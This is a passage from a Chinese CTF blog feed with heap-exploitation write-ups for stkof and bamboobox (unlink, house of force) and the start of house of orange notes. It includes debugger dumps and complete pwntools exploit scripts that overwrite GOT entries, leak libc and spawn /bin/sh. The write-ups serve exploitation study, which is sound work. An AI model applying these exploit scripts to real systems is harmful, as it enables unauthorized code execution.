<p>通过unlink技术得到的部分地址读写能力，可以修改chunk1的指针为free_got，chunk2的指针为puts_got，接下来对chunk1和chunk2的内容进行的修改，本质都是修改两个got表</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x602130</span><br><span class="line">0x602130:	0x0000000000000000	0x6161616161616161</span><br><span class="line">0x602140:	0x6161616161616161	0x0000000000602018</span><br><span class="line">0x602150:	0x0000000000602020	0x0000000000000000</span><br><span class="line">0x602160:	0x00000000020f8530	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018 &lt;free@got.plt&gt;:	0x00007fbcdd619540	0x00007fbcdd6046a0</span><br><span class="line">0x602028 &lt;fread@got.plt&gt;:	0x00007fbcdd6031b0	0x0000000000400786</span><br></pre></td></tr></table></figure>
<h4 id="5-获取打印功能，泄露地址"><a href="#5-获取打印功能，泄露地址" class="headerlink" title="5.获取打印功能，泄露地址"></a>5.获取打印功能，泄露地址</h4><blockquote>
<p>由于前面已经修改chunk1的指针为got表指针，所以，直接fill chunk1的内容为puts_plt，那么free()时就是执行puts函数，从而泄露地址。</p>
<p>由于chunk2的指针已经为puts_got，所以free(2)就是puts(puts函数的got表)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018 &lt;free@got.plt&gt;:	0x0000000000400760	0x00007fbcdd6046a0</span><br><span class="line">0x602028 &lt;fread@got.plt&gt;:	0x00007fbcdd6031b0	0x0000000000400786</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000400760</span><br><span class="line">0x400760 &lt;puts@plt&gt;:	0x0168002018ba25ff	0xffffffd0e9000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p>泄露成功，可以计算libc基址、system函数地址</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    00000000  a0 46 60 dd  bc 7f 0a                               │·F&#96;·│···│</span><br><span class="line">    00000007</span><br><span class="line">    </span><br><span class="line">pwndbg&gt; x&#x2F;30gx puts</span><br><span class="line">0x7fbcdd6046a0 &lt;_IO_puts&gt;:</span><br></pre></td></tr></table></figure>
<h4 id="6-free-gt-system，块内容“-bin-sh”"><a href="#6-free-gt-system，块内容“-bin-sh”" class="headerlink" title="6.free-&gt;system，块内容“/bin/sh”"></a>6.free-&gt;system，块内容“/bin/sh”</h4><blockquote>
<p>同5，再次fill chunk1内容为system的地址，然后执行free函数就是执行system函数。</p>
<p>对未使用的chunk4填入“/bin/sh”内容，free(4)即可执行system(“/bin/sh”)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018 &lt;free@got.plt&gt;:	0x00007fbcdd5da3a0	0x00007fbcdd6046a0</span><br><span class="line">0x602028 &lt;fread@got.plt&gt;:	0x00007fbcdd6031b0	0x0000000000400786</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007fbcdd5da3a0</span><br><span class="line">0x7fbcdd5da3a0 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x00000000000000c1</span><br><span class="line">0x20f8470:	0x00007fbcdd959b78	0x00007fbcdd959b78</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x00000000000000c0	0x0000000000000030</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000#chunk4</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x00000000000000c1</span><br><span class="line">0x20f8470:	0x00007fbcdd959b78	0x00007fbcdd959b78</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x00000000000000c0	0x0000000000000030</span><br><span class="line">0x20f8530:	0x0068732f6e69622f	0x0000000000000000#chunk4填入“&#x2F;bin&#x2F;sh”</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;10s 0x20f8530</span><br><span class="line">0x20f8530:	&quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./stkof'</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28999</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(free_got) + p64(puts_got)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(system))</span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">4</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这道题其实是第二次做了，还比较顺。思路比第一次更清晰了（<a href="https://warm-winter.github.io/2020/11/11/%C2%96ctf-wiki%E7%9A%84%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/#2014-hitcon-stkof" target="_blank" rel="noopener">第一次分析</a>）。</p>
<p>unlink主要适用于存在堆溢出和全局变量的情况。</p>
</blockquote>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcontraining_bamboobox</title>
    <url>/2021/04/24/21-36/</url>
    <content><![CDATA[<blockquote>
<p>hitcontraining_bamboobox这道题有两种解题方式：</p>
<ol>
<li><p>house of force</p>
<p>参考：<a href="https://paper.seebug.org/521/#house-of-force" target="_blank" rel="noopener">house of force</a></p>
</li>
<li><p>unlink</p>
</li>
</ol>
</blockquote>
<h2 id="house-of-force（详解）"><a href="#house-of-force（详解）" class="headerlink" title="house of force（详解）"></a>house of force（详解）</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<p>只要top chunk size够大，就能随意申请chunk</p>
<p>所以，如果有溢出能控制top chunk size，就可以修改其为-1（0xffffffff最大值），然后malloc(负数)可以向上申请，malloc(正数)</p>
</blockquote>
<h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><p>程序一开始申请0x10的块，存放hello_message和goodbye_message的指针，而且最后在功能5中会调用goodbye_message。</p>
<p><img src="/2021/04/24/21-36/image-20210424211521894.png" alt="image-20210424211521894"></p>
<p><img src="/2021/04/24/21-36/image-20210424211735644.png" alt="image-20210424211735644"></p>
<p>所以，可以通过house of force修改top chunk size，然后将top chunk申请到v3里，修改v3的指针为后门函数magic的地址，然后即可get flag。</p>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-申请一个chunk"><a href="#1-申请一个chunk" class="headerlink" title="1.申请一个chunk"></a>1.申请一个chunk</h4><blockquote>
<p>为了不跟v3的大小0x10撞，选择0x30的大小。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1a89000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1a89020</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1a89060</span><br><span class="line">Size: 0x20fa1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x1a89000</span><br><span class="line">0x1a89000:	0x0000000000000000	0x0000000000000021#v3</span><br><span class="line">0x1a89010:	0x0000000000400896	0x00000000004008b1#hello_message、goodbye_message</span><br><span class="line">0x1a89020:	0x0000000000000000	0x0000000000000041#申请的chunk</span><br><span class="line">0x1a89030:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x1a89040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1a89050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1a89060:	0x0000000000000000	0x0000000000020fa1#top chunk size</span><br><span class="line">0x1a89070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1a89080:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h3 id="2-堆溢出修改top-chunk"><a href="#2-堆溢出修改top-chunk" class="headerlink" title="2.堆溢出修改top chunk"></a>2.堆溢出修改top chunk</h3><p>手动输入新top chunk为最大值0xffffffffffffffff（本质就是-1，但好像直接-1不太好使，，，）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xc32000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xc32020</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: 0xc32060</span><br><span class="line">Size: 0x-1	#成功修改为-1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xc32000</span><br><span class="line">0xc32000:	0x0000000000000000	0x0000000000000021	#v3（目的地址）</span><br><span class="line">0xc32010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0xc32020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xc32030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xc32040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xc32050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xc32060:	0x0000000000000000	0xffffffffffffffff	#chunk</span><br><span class="line">0xc32070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="3-向上申请到v3的地址"><a href="#3-向上申请到v3的地址" class="headerlink" title="3.向上申请到v3的地址"></a>3.向上申请到v3的地址</h4><p>向上申请块，需要malloc(负数)，负数 =  0xc32000 - 0xc32060 - 0x10 = -0x70（-112）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xeae000	#成功修改chunk的位置</span><br><span class="line">Size: 0x59</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xeae000</span><br><span class="line">0xeae000:	0x0000000000000000	0x0000000000000059#目的地址</span><br><span class="line">0xeae010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0xeae020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xeae030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xeae040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xeae050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xeae060:	0x0000000000000000	0x00ffffffffffffa1</span><br><span class="line">0xeae070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="4-申请一个块，填入内容magic"><a href="#4-申请一个块，填入内容magic" class="headerlink" title="4.申请一个块，填入内容magic"></a>4.申请一个块，填入内容magic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x2034000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x2034020</span><br><span class="line">Size: 0x39</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x2034000</span><br><span class="line">0x2034000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x2034010:	0x0000000000400d49	0x0000000000400d49	#修改成功</span><br><span class="line">0x2034020:	0x0000000000000000	0x0000000000000039</span><br><span class="line">0x2034030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x2034040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x2034050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x2034060:	0x0000000000000000	0x00ffffffffffffa1</span><br><span class="line">0x2034070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="执行功能5"><a href="#执行功能5" class="headerlink" title="执行功能5"></a>执行功能5</h4><p>也就是会<code>v3[1]()</code>,v3[1]的地址已经被修改为magic的地址，故将执行后门函数magic()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0xe bytes:</span><br><span class="line">    &#39;flag&#123;good_job&#125;&#39;</span><br><span class="line">flag&#123;good_job&#125;[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x00400D49</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"name of item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">"new name of the item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">4</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">alloc(<span class="number">-112</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><blockquote>
<p>unlink具体已经通过<a href="https://warm-winter.github.io/2021/04/20/hitcon-2014-stkof%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">hitcon_2014_stkof详解</a>学习了，但是做本题的时候，遇到了一些问题，，，记录下。</p>
<p>思路比较简单：</p>
<ol>
<li>unlink</li>
<li>修改chunk1指针为atoi_got</li>
<li>show打印atoi地址，计算system</li>
<li>edit修改stoi_got为system地址</li>
<li>重新启动的时候，发送’/bin/sh’即可执行atoi(输入的数据) =&gt; system(‘/bin/sh’)</li>
</ol>
</blockquote>
<h3 id="未解决的问题"><a href="#未解决的问题" class="headerlink" title="未解决的问题"></a>未解决的问题</h3><h4 id="1-target取值问题"><a href="#1-target取值问题" class="headerlink" title="1.target取值问题"></a>1.target取值问题</h4><p><code>target = 0x6020c8</code>可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020c0</span><br><span class="line">0x6020c0 &lt;itemlist&gt;:	0x0000000000000030	0x00000000006020b0</span><br><span class="line">0x6020d0 &lt;itemlist+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;itemlist+32&gt;:	0x0000000000000030	0x00000000022e8100</span><br><span class="line">0x6020f0 &lt;itemlist+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>但是<code>target = 0x6020c8+0x10</code>会导致整个脚本不可用。</p>
<blockquote>
<p>难道是不能最后清零？</p>
</blockquote>
<h4 id="2-覆盖指针问题"><a href="#2-覆盖指针问题" class="headerlink" title="2.覆盖指针问题"></a>2.覆盖指针问题</h4><p>就很奇怪，不能用puts_got表（0x602020），同样报错，其他的可以，，，</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27073</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./bamboobox"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"name of item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">"new name of the item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">4</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>,<span class="string">"bbbb"</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">"cccc"</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span>   <span class="comment">#not be last</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># x/30gx 0x6020c8</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line"><span class="comment"># print(hex(puts_got))</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(atoi_got)</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">show()</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.success(hex(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其实这道题比<a href="https://warm-winter.github.io/2021/04/20/hitcon-2014-stkof%E8%AF%A6%E8%A7%A3/#" target="_blank" rel="noopener">hitcon_2014_stkof详解</a>这道题要简单，，，给了打印函数，可以直接show出来地址（无须构造puts），覆盖atoi方便，因为程序开头有atoi（输入八字节）的操作，只要覆盖atoi_got表为system地址即可get shell。</p>
</blockquote>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>house of force</tag>
      </tags>
  </entry>
  <entry>
    <title>house of orange</title>
    <url>/2021/05/13/13-41/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="针对类型"><a href="#针对类型" class="headerlink" title="针对类型"></a>针对类型</h2><ol>
<li><p>程序中没有free函数</p>
</li>
<li><p>程序存在堆溢出，可以修改top chunk</p>
</li>
<li><p>使用libc版本：2.23-2.24</p>
<p>2.27不适用原因：取消了abort刷新流的操作</p>
</li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h3><ol>
<li>堆溢出修改top chunk</li>
<li>申请比top chunk size大的chunk =&gt; top chunk放到unsorted bin中</li>
<li>利用unsorted bin attack结合FSOP（修改IO_list_all劫持到伪造的IO_FILE结构上） =&gt; getshell。</li>
</ol>
<h3 id="2-24"><a href="#2-24" class="headerlink" title="2.24"></a>2.24</h3><blockquote>
<p>待更新</p>
</blockquote>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="free-topchunk"><a href="#free-topchunk" class="headerlink" title="free topchunk"></a>free topchunk</h3><p>申请size&gt;top chunk，调用sysmalloc分配，分为两种情况：</p>
<ol>
<li>size&gt;=mp_.mmap_threshold（0x20000），mmap分配</li>
<li>否则，释放原来的topchunk，并申请一个新的topchunk</li>
</ol>
<h4 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h4><blockquote>
<p>具体看参考的，这里只记录方法</p>
</blockquote>
<ol>
